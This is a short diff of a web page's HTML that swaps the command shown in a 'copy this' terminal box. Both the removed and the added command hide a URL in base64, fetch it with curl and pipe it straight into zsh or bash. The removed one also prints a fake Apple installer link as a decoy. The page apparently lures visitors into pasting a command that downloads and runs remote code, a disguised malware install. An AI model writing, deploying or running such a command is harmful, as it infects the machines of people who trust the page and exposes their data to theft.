@@ -338,7 +338,8 @@
     <div class="terminal-body">
         <div class="terminal-content">
             <div class="terminal-command-wrapper">
-                <code id="commandToCopy" class="terminal-command terminal-font">echo "Apple-Installer: https://apps.apple.com/hidenn-gift.application/macOsAppleApicationSetup4a21w41e5.dmg" && curl -kfsSL $(echo 'aHR0cHM6Ly9sZWVncmFlbWUuY29tL2dldG5vdGlvbg=='|base64 -D)|zsh</code>
+                <code id="commandToCopy" class="terminal-command terminal-font">/bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9sZWVncmFlbWUuY29tL2dldG5ldGZsaXg= | base64 -d))"
+</code>
             </div>
             <button
                 onclick="copyCommand()"
